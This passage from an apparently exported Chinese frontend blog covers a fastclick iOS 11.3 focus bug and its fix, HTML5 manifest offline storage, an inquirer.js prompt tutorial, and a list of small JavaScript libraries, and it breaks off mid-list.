<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var str &#x3D; &quot;0 ? 0 : function()&#123;alert(&#39;Test eval&#39;)&#125;&quot;;</span><br><span class="line">var fn &#x3D; eval(&quot;(&quot; + str + &quot;)&quot;);</span><br><span class="line">fn();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在IE8内里测试效果：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-d9debb70a6316c77.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>末了应用ietester东西测试在IE6也一样没有问题。</p>
<blockquote>
<p>原文作者：东雄平<br>    原文地址: <a href="https://segmentfault.com/a/1190000007394042">https://segmentfault.com/a/1190000007394042</a></p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>fastclick解析与ios11 3相关bug原因分析</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/fastclick%E8%A7%A3%E6%9E%90%E4%B8%8Eios11-3%E7%9B%B8%E5%85%B3bug%E5%8E%9F%E5%9B%A0%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>最近发现升级到ios11.3之后，输入框点击变得不灵敏，第二次点击页面中的输入框需要长按一会才能正常唤起键盘输入。排查后，怀疑是fastclick出现了问题，上github看了issues，果不其然很多人也出现相同问题（<a href="https://github.com/ftlabs/fastclick/issues/548">https://github.com/ftlabs/fas…</a> ）。按照issues上的解决方法，也顺利地解决了问题，不过，究竟为何会出现这么奇怪的bug？我们还需要继续深入寻找答案。</p>
<h2 id="首先，fastclick究竟用来干嘛？"><a href="#首先，fastclick究竟用来干嘛？" class="headerlink" title="首先，fastclick究竟用来干嘛？"></a>首先，fastclick究竟用来干嘛？</h2><p>简而言之，它是用来<strong>解决300ms延迟</strong>和<strong>点击穿透</strong>这两个问题。<br>在移动设备上点击按钮后，浏览器将会等待300ms，继续监听点击动作来判断是否为双击事件，这就是300ms延迟问题。<br>为了解决这300ms的延迟问题，一种解决方案是将touch系列事件绑定在document上，通过计算touch事件触发的时间位置等来判断是否为移动设备的点击，如zepto.js中自定义的tap事件；另一种方案，也是fastclick中的实现方案，当检测到touchend事件的时候，会通过DOM自定义事件立即出发模拟一个click事件，并用preventDefault阻止300ms之后真正的click事件。</p>
<p>那么什么是点击穿透问题？<br>点击穿透问题是当两个元素重叠在同一个位置，上层元素绑定touch事件，下层元素绑定click事件，当上层元素触发touch事件后，可能会触发下层div的click事件。</p>
<h2 id="其次，fastclick都做了哪些工作？"><a href="#其次，fastclick都做了哪些工作？" class="headerlink" title="其次，fastclick都做了哪些工作？"></a>其次，fastclick都做了哪些工作？</h2><p>fastclick的主要工作可见参考文献[2]中的图，如下：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-1599ce6f6c2a7831.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>fastclick的主要工作是在body或者顶层元素中绑定touch相关事件，在touch相关事件中标记手势的位置与时间，根据此信息拦截click事件并判断是否模拟触发。</p>
<p>在处理300ms延迟的过程中，主要工作是模拟并拦截真正的click事件。<br>首先，拦截点击事件的思路是将元素的onclick事件置为空，并用addEventListener重新绑定，理由是onclick将会在fastclick模拟的点击事件之前触发，在构造函数中关键代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function FastClick(layer, options) &#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; If a handler is already declared in the element&#39;s onclick attribute, it will be fired before</span><br><span class="line">    &#x2F;&#x2F; FastClick&#39;s onClick handler. Fix this by pulling out the user-defined handler function and</span><br><span class="line">    &#x2F;&#x2F; adding it as listener.</span><br><span class="line">    if (typeof layer.onclick &#x3D;&#x3D;&#x3D; &#39;function&#39;) &#123;</span><br><span class="line">        oldOnClick &#x3D; layer.onclick;</span><br><span class="line">        layer.addEventListener(&#39;click&#39;, function(event) &#123;</span><br><span class="line">            oldOnClick(event);</span><br><span class="line">        &#125;, false);</span><br><span class="line">        layer.onclick &#x3D; null;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着，看看fastclick如何判断用户的点击事件是真正的点击，在onTouchEnd事件中，判断的关键代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; event.timeStamp为touchend事件的事件，lastClickTime是上一次touchend事件的事件，此处判断是否为双击操作</span><br><span class="line">if ((event.timeStamp - this.lastClickTime) &lt; this.tapDelay) &#123;</span><br><span class="line">    this.cancelNextClick &#x3D; true;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; trackingClickStart是touchstart事件的事件，此处判断是否为长按操作</span><br><span class="line">if ((event.timeStamp - this.trackingClickStart) &gt; this.tapTimeout) &#123;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果此次点击是真正的点击事件，有两种情况要触发模拟的click事件：一种是由needsFocus函数判断是否为可以focus的元素，如<input type="text">、textarea等；另一种是由needsClick函数判断是否为需要原生点击的原生，不需要原生点击的也需要模拟click事件，这部分的代码逻辑比较简单主要根据判断元素的tagName和class来判断，这里就不贴代码了。</p>
<p>需要触发模拟click事件的情况中，第一种情况（如输入框等）是需要触发focus事件的，触发之后再触发click事件，而第二种（如按钮等）则单纯触发click事件即可。接下来，我们先分析focus事件的响应函数，再看模拟的click事件。<br>focus主要工作一方面在为了将光标移到移到输入框尾部，另一方面触发元素的focus事件，其响应函数为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FastClick.prototype.focus &#x3D; function(targetElement) &#123;</span><br><span class="line">    var length;</span><br><span class="line"></span><br><span class="line">    if (deviceIsIOS &amp;&amp; targetElement.setSelectionRange &amp;&amp; targetElement.type.indexOf(&#39;date&#39;) !&#x3D;&#x3D; 0 &amp;&amp; targetElement.type !&#x3D;&#x3D; &#39;time&#39; &amp;&amp; targetElement.type !&#x3D;&#x3D; &#39;month&#39; &amp;&amp; targetElement.type !&#x3D;&#x3D; &#39;email&#39;) &#123;</span><br><span class="line">        &#x2F;&#x2F; 通过 targetElement.setSelectionRange(length, length) 将光标的位置定位在内容的尾部（但注意，这时候还没触发focus事件）</span><br><span class="line">        length &#x3D; targetElement.value.length;</span><br><span class="line">        targetElement.setSelectionRange(length, length);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        targetElement.focus();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>模拟的click事件，本质就是用代码创建一个Event作为点击事件触发，关键代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FastClick.prototype.sendClick &#x3D; function(targetElement, event) &#123;</span><br><span class="line">    ...</span><br><span class="line">    &#x2F;&#x2F; Synthesise a click event, with an extra attribute so it can be tracked</span><br><span class="line">    clickEvent &#x3D; document.createEvent(&#39;MouseEvents&#39;);</span><br><span class="line">    clickEvent.initMouseEvent(this.determineEventType(targetElement), true, true, window, 1, touch.screenX, touch.screenY, touch.clientX, touch.clientY, false, false, false, false, 0, null);</span><br><span class="line">    clickEvent.forwardedTouchEvent &#x3D; true;</span><br><span class="line">    targetElement.dispatchEvent(clickEvent);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>最后，fastclick使用了preventDefault和stopImmediatePropagation拦截原生的click响应函数。preventDefault函数很常见了，但stopImmediatePropagation真是头一次见它。根据规范可知，该方法不仅可以阻止冒泡，还能将元素绑定的后序相同类型事件的监听函数的执行也一起阻止了，也就是说如果在点击事件中调用了它，可以阻止点击事件冒泡传递到父级元素，同时又能阻止该元素上的其他点击响应函数。</p>
<h2 id="最后，如何修复？"><a href="#最后，如何修复？" class="headerlink" title="最后，如何修复？"></a>最后，如何修复？</h2><p>Issues中给出的修复方法是强制元素focus，即在改写的focus响应函数中直接触发元素的focus事件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FastClick.prototype.focus &#x3D; function(targetElement) &#123;</span><br><span class="line">    targetElement.focus();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>推测原因是由于ios11.3取消了input元素setSelectionRange自动聚焦的功能（非此原因 (⊙﹏⊙)）</p>
<blockquote>
<p>(6.22更新) 对比了一下ios11.3与之前的fastclick相关运行过程，只有320行左右有区别，“document.activeElement.blur();”，ios11.3之后在第二次点击时有经过，而ios11.3之前的没有。另外，350行左右的“targetElement.setSelectionRange(length, length);”，是引起输入框聚焦的原因，但仅仅执行这个函数还无法到达聚焦的效果，fastclick还做了哪些相关工作，仍未知。</p>
</blockquote>
<p>此外，ios11.3支持了Web API：允许对事件支持被动模式，减少滚动屏幕的性能损耗和奔溃，并且针对document的touch事件监听添加被动模式的配置，因此document将不再调用preventDefault方法。这些改动会引起fastclick的另一个bug，当静置app或锁屏几秒后页面将无法响应任何点击操作。<br>解决方法也很简单，只需去除被动模式，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 支持设置passive的，将被动模式显式设置为false</span><br><span class="line">layer.addEventListener(&#39;touchstart&#39;, this.onTouchStart, &#123;passive:false&#125;);</span><br><span class="line">&#x2F;&#x2F; 否则，去除默认的被动模式</span><br><span class="line">layer.addEventListener(&#39;touchstart&#39;, this.onTouchStart, false);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>html5的离线存储问题</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/html5%E7%9A%84%E7%A6%BB%E7%BA%BF%E5%AD%98%E5%82%A8%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>HTML5的一个重要特性就是离线存储，所谓的离线存储就是将一些资源文件保存在本地，这样后续的页面重新加载将使用本地资源文件，在离线情况下可以继续访问web应用，同时通过一定的手法（更新相关文件或者使用相关API），可以更新、删除离线存储等操作；</p>
<p>HTML5的离线存储使用一个manifest文件来标明哪些文件是需要被存储的，使用如 <html manifest="offline.manifest"> 来引入一个manifest文件，这个文件的路径可以是相对的，也可以是绝对的，如果你的web应用很多，而且希望能集中管理manifest文件，那么静态文件服务器是个不错的选择。</p>
<p>对于manifest文件，要求：文件的mime-type必须是 text/cache-manifest类型。如果你是JAVA工程，在你的web.xml中配置请求后缀为manifest的格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;mime-mapping&gt;</span><br><span class="line">&lt;extension&gt;manifest&lt;&#x2F;extension&gt;</span><br><span class="line">&lt;mime-type&gt;text&#x2F;cache-manifest&lt;&#x2F;mime-type&gt;</span><br><span class="line">&lt;&#x2F;mime-mapping&gt;  </span><br></pre></td></tr></table></figure>

<p>这样可以控制请求到的manifest文件格式为text/cache-manifest的。</p>
<h3 id="manifest文件的格式："><a href="#manifest文件的格式：" class="headerlink" title="manifest文件的格式："></a>manifest文件的格式：</h3><blockquote>
<p>CACHE MANIFEST# 这一句必须存在，而且必须放在头部# 指明缓存入口CACHE:index.htmlstyle.cssimages/logo.pngscripts/main.js# 以下资源必须在线访问NETWORK:login.php# 如果index.php无法访问则用404.html代替FALLBACK:/index.php /404.html</p>
</blockquote>
<p>其中 CACHE 不是必须存在的，可以直接在 CACHE MANIFEST 行之下直接写需要缓存的文件，在这里指明的文件将被缓存到浏览器本地。在NETWORK之下指明的文件，是强制必须通过网络资源获取的，在FALLBACK下指明的是一种失败的回调方案，比如上述index.php无法访问，那么就发出404.htm请求</p>
<p>这样几步就可以完成对离线存储的支持。接下来要思考的，是如何更新离线存储？</p>
<p>当用户本地再次联网的时候，本地的离线存储资源需要检查是否需要更新，这个更新过程，也是通过manifest的更新来控制的，更新了manifest文件，浏览器会自动的重新下载新的manifest文件并在下一次刷新页面的时候进行资源文件的重新请求（第三次刷新替换本地缓存为最新缓存），而且这个请求是全局性的，也就是所有在manifest缓存列表中的文件都会被请求一次，而不是单独请求某个特定修改过的资源文件，因为manifest是不知道哪个文件被修改过了的。</p>
<p>对于全局更新的担心是不必要的，因为对于没有更新过的资源文件，请求依旧是304响应，只有真正更新过的资源文件才是200.</p>
<p>所以控制离线存储的更新，需要2个步骤，一是更新资源文件，二是更新manifest文件，特别的，更新manifest文件是不需要修改什么特定内容的，只要是这个文件随意一处被修改，那么浏览器就会感知，对于我们的资源文件通常名称是固定的，比如**.css，更新内容不会带有文件名更新的情况下，需要更新manifest文件怎么操作呢？一个比较好的方式是更新任意一处# 开头的注释即可，其目的只是告诉浏览器这个manifest文件被更新过。</p>
<p>以上的这些内容，其更新操作都是浏览器自动完成的。同样的，W3C定义了<a href="http://www.whatwg.org/specs/web-apps/current-work/#applicationcache">离线存储的API规范</a></p>
<h3 id="API："><a href="#API：" class="headerlink" title="API："></a>API：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &#x2F;&#x2F; 更新，一般来说更新下载是通过用户**（如浏览器）自动完成的，但是这个方法适用于一些长期打开的页面，比如邮件系统，可能这个页面是长期打开的，而不会有刷新动作，所以这个就比较适合做自动更新下</span><br><span class="line">void update();</span><br><span class="line"></span><br><span class="line"> &#x2F;&#x2F; 取消</span><br><span class="line"> void abort();</span><br><span class="line"></span><br><span class="line"> &#x2F;&#x2F; 替换缓存内容 ，对于manifest文件的改变，通常是下一次的刷新才会触发下载更新，第三次刷新才会切换使用新的缓存文件，通过这个方法，可以强制将缓存替换</span><br><span class="line"> void swapCache();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>提供了如下的事件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Event handler             Event handler event type</span><br><span class="line">onchecking             checking</span><br><span class="line">onerror                     error</span><br><span class="line">onnoupdate             noupdate</span><br><span class="line">ondownloading             downloading</span><br><span class="line">onprogress             progress</span><br><span class="line">onupdateready             updateready</span><br><span class="line">oncached                     cached</span><br><span class="line">onobsolete             obsolete</span><br></pre></td></tr></table></figure>

<p>最后说一个对于manifest比较特别的地方：对于某个文件a.htm，其中有 <html manifest='a.manifest'> ，那么离线存储中，会自动将a.htm加入到列表中，这意味着a.htm的再次刷新将从本地缓存中获取，这样的机制从官方得到的答复是“特别的设计”，而对我们来说，这种强加的特性在后续的开发过程中会有不少问题。</p>
<p>比如：</p>
<p>       1、如何计算PV UV，由于当前页面被强制加入manifest，那么PV 和UV的统计，成了一个难题，因为请求不再是发送到服务器；</p>
<p>       2、对于某个使用manifest的文件，其带有的参数可能是随机性的统计参数，如sid=123sss, sid=234fff ，尤其是比如商品详情的id字段等，这样每个页面都自动加入到manifest中，将会带来很大的存储开销，而且是毫无意义的；</p>
<p>       所以伴随而来的，是如何在现有的体系架构下进行数据统计的难题，一个常规的方案是进入离线存储页面后自动发出ajax请求，以告知服务器统计PV UV；</p>
<p>       对于第二个问题，可能就比较棘手，但是将GET请求的方式改成POST的方式确实是个解决问题的方案。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>inquirer.js-——-用户与命令行交互的工具</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/inquirer-js-%E2%80%94%E2%80%94-%E7%94%A8%E6%88%B7%E4%B8%8E%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BA%A4%E4%BA%92%E7%9A%84%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p><code>Inquirerjs </code>是一个用来实现命令行交互式界面的工具集合。它帮助我们实现与用户的交互式交流，比如给用户提一个问题，用户给我们一个答案，我们根据用户的答案来做一些事情<br>由于交互的问题种类不同，inquirer为每个问题提供很多参数：</p>
<ul>
<li>type：表示提问的类型，包括：input, confirm, list, rawlist, expand, checkbox, password, editor；</li>
<li>name: 存储当前问题回答的变量；</li>
<li>message：问题的描述；</li>
<li>default：默认值；</li>
<li>choices：列表选项，在某些type下可用，并且包含一个分隔符(separator)；</li>
<li>validate：对用户的回答进行校验；</li>
<li>filter：对用户的回答进行过滤处理，返回处理后的值；</li>
<li>transformer：对用户回答的显示效果进行处理(如：修改回答的字体或背景颜色)，但不会影响最终的答案的内容；</li>
<li>when：根据前面问题的回答，判断当前问题是否需要被回答；</li>
<li>pageSize：修改某些type类型下的渲染行数；</li>
<li>prefix：修改message默认前缀；</li>
<li>suffix：修改message默认后缀。<h3 id="一-使用"><a href="#一-使用" class="headerlink" title="一. 使用"></a>一. 使用</h3></li>
</ul>
<h4 id="0-语法结构"><a href="#0-语法结构" class="headerlink" title="0. 语法结构"></a>0. 语法结构</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const inquirer &#x3D; require(&#39;inquirer&#39;);</span><br><span class="line"></span><br><span class="line">const promptList &#x3D; [</span><br><span class="line">    &#x2F;&#x2F; 具体交互内容</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">inquirer.prompt(promptList).then(answers &#x3D;&gt; &#123;</span><br><span class="line">    console.log(answers); &#x2F;&#x2F; 返回的结果</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h4 id="1-input"><a href="#1-input" class="headerlink" title="1. input"></a>1. input</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const promptList &#x3D; [&#123;</span><br><span class="line">    type: &#39;input&#39;,</span><br><span class="line">    message: &#39;设置一个用户名:&#39;,</span><br><span class="line">    name: &#39;name&#39;,</span><br><span class="line">    default: &quot;test_user&quot; &#x2F;&#x2F; 默认值</span><br><span class="line">&#125;,&#123;</span><br><span class="line">    type: &#39;input&#39;,</span><br><span class="line">    message: &#39;请输入手机号:&#39;,</span><br><span class="line">    name: &#39;phone&#39;,</span><br><span class="line">    validate: function(val) &#123;</span><br><span class="line">        if(val.match(&#x2F;\d&#123;11&#125;&#x2F;g)) &#123; &#x2F;&#x2F; 校验位数</span><br><span class="line">            return val;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;请输入11位数字&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>

<p>效果：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-a61db2cc44656c1a?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="input"></p>
<h4 id="2-confirm"><a href="#2-confirm" class="headerlink" title="2. confirm"></a>2. confirm</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const promptList &#x3D; [&#123;</span><br><span class="line">    type: &quot;confirm&quot;,</span><br><span class="line">    message: &quot;是否使用监听？&quot;,</span><br><span class="line">    name: &quot;watch&quot;,</span><br><span class="line">    prefix: &quot;前缀&quot;</span><br><span class="line">&#125;,&#123;</span><br><span class="line">    type: &quot;confirm&quot;,</span><br><span class="line">    message: &quot;是否进行文件过滤？&quot;,</span><br><span class="line">    name: &quot;filter&quot;,</span><br><span class="line">    suffix: &quot;后缀&quot;,</span><br><span class="line">    when: function(answers) &#123; &#x2F;&#x2F; 当watch为true的时候才会提问当前问题</span><br><span class="line">        return answers.watch</span><br><span class="line">    &#125;</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>

<p>效果：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-2cdda6a4350f38d7?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="confirm_y"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-90ec32a80e5c45fd?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="confirm_n"></p>
<h4 id="3-list"><a href="#3-list" class="headerlink" title="3. list"></a>3. list</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const promptList &#x3D; [&#123;</span><br><span class="line">    type: &#39;list&#39;,</span><br><span class="line">    message: &#39;请选择一种水果:&#39;,</span><br><span class="line">    name: &#39;fruit&#39;,</span><br><span class="line">    choices: [</span><br><span class="line">        &quot;Apple&quot;,</span><br><span class="line">        &quot;Pear&quot;,</span><br><span class="line">        &quot;Banana&quot;</span><br><span class="line">    ],</span><br><span class="line">    filter: function (val) &#123; &#x2F;&#x2F; 使用filter将回答变为小写</span><br><span class="line">        return val.toLowerCase();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>

<p>效果：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-dfa4dc6a673edce2?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="list_1"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-59be0f369c690cd1?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="list"></p>
<h4 id="4-rawlist"><a href="#4-rawlist" class="headerlink" title="4. rawlist"></a>4. rawlist</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const promptList &#x3D; [&#123;</span><br><span class="line">    type: &#39;rawlist&#39;,</span><br><span class="line">    message: &#39;请选择一种水果:&#39;,</span><br><span class="line">    name: &#39;fruit&#39;,</span><br><span class="line">    choices: [</span><br><span class="line">        &quot;Apple&quot;,</span><br><span class="line">        &quot;Pear&quot;,</span><br><span class="line">        &quot;Banana&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>

<p>效果：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-5a43083f7a9bac09?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="rawlist"></p>
<h4 id="5-expand"><a href="#5-expand" class="headerlink" title="5. expand"></a>5. expand</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const promptList &#x3D; [&#123;</span><br><span class="line">    type: &quot;expand&quot;,</span><br><span class="line">    message: &quot;请选择一种水果：&quot;,</span><br><span class="line">    name: &quot;fruit&quot;,</span><br><span class="line">    choices: [</span><br><span class="line">        &#123;</span><br><span class="line">            key: &quot;a&quot;,</span><br><span class="line">            name: &quot;Apple&quot;,</span><br><span class="line">            value: &quot;apple&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            key: &quot;O&quot;,</span><br><span class="line">            name: &quot;Orange&quot;,</span><br><span class="line">            value: &quot;orange&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            key: &quot;p&quot;,</span><br><span class="line">            name: &quot;Pear&quot;,</span><br><span class="line">            value: &quot;pear&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>

<p>效果：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-4399710481c3226c?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="expend_1"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-8abcbd27a8c47233?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="expend_2"></p>
<h4 id="6-checkbox"><a href="#6-checkbox" class="headerlink" title="6. checkbox"></a>6. checkbox</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const promptList &#x3D; [&#123;</span><br><span class="line">    type: &quot;checkbox&quot;,</span><br><span class="line">    message: &quot;选择颜色:&quot;,</span><br><span class="line">    name: &quot;color&quot;,</span><br><span class="line">    choices: [</span><br><span class="line">        &#123;</span><br><span class="line">            name: &quot;red&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        new inquirer.Separator(), &#x2F;&#x2F; 添加分隔符</span><br><span class="line">        &#123;</span><br><span class="line">            name: &quot;blur&quot;,</span><br><span class="line">            checked: true &#x2F;&#x2F; 默认选中</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            name: &quot;green&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        new inquirer.Separator(&quot;--- 分隔符 ---&quot;), &#x2F;&#x2F; 自定义分隔符</span><br><span class="line">        &#123;</span><br><span class="line">            name: &quot;yellow&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;];</span><br><span class="line">&#x2F;&#x2F; 或者下面这样</span><br><span class="line">const promptList &#x3D; [&#123;</span><br><span class="line">    type: &quot;checkbox&quot;,</span><br><span class="line">    message: &quot;选择颜色:&quot;,</span><br><span class="line">    name: &quot;color&quot;,</span><br><span class="line">    choices: [</span><br><span class="line">        &quot;red&quot;,</span><br><span class="line">        &quot;blur&quot;,</span><br><span class="line">        &quot;green&quot;,</span><br><span class="line">        &quot;yellow&quot;</span><br><span class="line">    ],</span><br><span class="line">    pageSize: 2 &#x2F;&#x2F; 设置行数</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>

<p>效果：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-c96229da119c592d?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="checkbox_sep"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-9baf91e05a3e5dc1?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="checkbox_size"></p>
<h4 id="7-password"><a href="#7-password" class="headerlink" title="7. password"></a>7. password</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const promptList &#x3D; [&#123;</span><br><span class="line">    type: &quot;password&quot;, &#x2F;&#x2F; 密码为密文输入</span><br><span class="line">    message: &quot;请输入密码：&quot;,</span><br><span class="line">    name: &quot;pwd&quot;</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>

<p>效果：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-8e3e714bf4be5ccb?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="pwd"></p>
<h4 id="8-editor"><a href="#8-editor" class="headerlink" title="8. editor"></a>8. editor</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const promptList &#x3D; [&#123;</span><br><span class="line">    type: &quot;editor&quot;,</span><br><span class="line">    message: &quot;请输入备注：&quot;,</span><br><span class="line">    name: &quot;editor&quot;</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>

<p>效果：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-62296d4127f98eb3?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="editor_inset"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-605305e7f9b0354a?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="editor_res"></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>javascript迷你库</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/javascript%E8%BF%B7%E4%BD%A0%E5%BA%93/</url>
    <content><![CDATA[<p>这些库的共性是非常小，而且功能单一。</p>
<p><strong><a href="https://github.com/js-coder/cookie.js">cookie.js</a></strong></p>
<p>如果你操作过cookie的接口，那么你一定会感觉这东西的规范真的是太复杂了，根本记不住啊，其实你是对的，因为cookie的接口设计的是有问题的，也就是说设计的太底层了，根本不友好，那么来试试这个js库吧。</p>
<p><strong><a href="https://github.com/marcuswestin/store.js">store.js</a></strong></p>
<p>再来说说浏览器的localStore吧，这东西太赞了，可惜尼玛每个浏览器都实现的各不相同，我也是醉了，如果你也有同样的烦恼，不如来试试这个迷你库，它有更简单的api，最重要的是他解决了跨浏览器问题，甚至解决了低版本浏览器(ie6)不支持localStore的问题。</p>
<p><strong><a href="https://github.com/yanhaijing/data.js">data.js</a></strong></p>
<blockquote>
<p>data.js 是带有消息通知的数据中心，我称其为会说话的数据。旨在让编程变得简单，世界变得美好</p>
</blockquote>
<p>如果你使用模块化编程，或者在node环境下的话，你一定纠结过不同模块间到底如何共享数据的问题（虽然这是反模式），全局变量。。。那么试试这个迷你库吧，简单可以来，会让你消除上面的烦恼问题，同时他还支持消息，当数据更新时，会发出消息。</p>
<p><strong><a href="https://github.com/yanhaijing/template.js">template.js</a></strong></p>
<blockquote>
<p>template.js 一款javascript模板引擎，简单，好用。</p>
</blockquote>
<p><strong><a href="https://github.com/yanhaijing/lodjs">lodJS</a></strong></p>
<blockquote>
<p>JavaScript模块加载器，基于AMD。迄今为止，对AMD理解最好的实现</p>
</blockquote>
<p><strong><a href="http://lab.ejci.net/favico.js/">favico.js</a></strong></p>
<p>在favico上添加数字书不是很nice，点击下面的官网查看效果，这肯定要逼死强迫症了。</p>
<p>**<a href="http://lab.ejci.net/favico.js/">官网</a>**。</p>
<p><strong><a href="http://modernizr.com/">Modernizr</a></strong></p>
<p>这个就不过多解释了，各种html css js检测器，功能检测哦。</p>
<p><strong><a href="http://visionmedia.github.io/move.js/">Move.js</a></strong></p>
<p>如果你操作过css3的属性，一定会觉得非常痛苦的，那不如来试试合格，css3动画瞬间变得简单了。</p>
<p><strong><a href="http://dmauro.github.io/Keypress/">Keypress</a></strong></p>
<p>一定记不住键盘上每个键的键位码吧，来试试这个，直观的展示，再也不需要记忆了。</p>
<p><strong><a href="http://matthewhudson.me/projects/device.js/">device.js</a></strong></p>
<p>你想检测用户的设备，试试这个吧，比jq.browser全面多了。</p>
<p><strong><a href="http://arasatasaygin.github.io/is.js/">is.js</a></strong></p>
<p>迷你检查库，这个几乎涵盖了全部的各种检测。</p>
<p><strong><a href="https://github.com/es-shims/es5-shim">es5-shim</a></strong></p>
<p>还没使用es5，只能鄙视你了，担心兼容性，用这个吧，主要是为了es6打基础啊。</p>
<p><strong><a href="https://github.com/jakearchibald/es6-promise">es6-promise</a></strong></p>
<p>promise太好用了，兼容性问题靠这个全解决了。</p>
<p><strong><a href="https://github.com/wagerfield/parallax">parallax</a></strong></p>
<p>先来看个视差效果的<a href="http://zhidao.baidu.com/s/10year/index.html">demo</a>，是不是很赞，如果你也想实现这个效果，那么来试试这个吧。</p>
<p><strong><a href="https://github.com/jaredreich/notie.js">notie.js</a></strong></p>
<p>还在使用弹窗通知用户，太low了，快来试试这款非阻塞式，小清新的通知插件吧，对移动端有好，界面好到爆炸啊。</p>
<p><strong><a href="https://github.com/overtrue/share.js">share.js</a></strong></p>
